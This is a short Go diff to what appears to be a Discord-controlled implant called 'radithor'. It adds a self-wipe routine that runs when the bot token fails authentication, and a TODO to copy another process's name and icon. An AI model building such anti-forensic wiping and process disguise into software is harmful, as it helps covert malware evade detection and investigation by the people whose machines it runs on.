@@ -8,6 +8,7 @@ import (
 
 	"radithor/bot/discord"
 	"radithor/core"
+	"radithor/core/core_funcs"
 	"radithor/funcs"
 	"radithor/store"
 	"radithor/utils/discord_utils"
@@ -49,10 +50,18 @@ func StartBot() {
 
 	bot.AddHandler(onMessage)
 
+	// todo, if the name is random, make it have the same icon and name as the copied proc
+
 	for try := 0; ; try++ {
 		err := bot.Open()
 		if err == nil {
 			break
+		}
+
+		errStr := strings.ToLower(err.Error())
+		if strings.Contains(errStr, "authentication failed") { // the token is wrong, there is nothing we can do
+			core.LogError("[StartBot] bot authentication failed, wiping... (%v)", err)
+			core_funcs.Wipe(false)
 		}
 
 		toWait := 2 * time.Hour
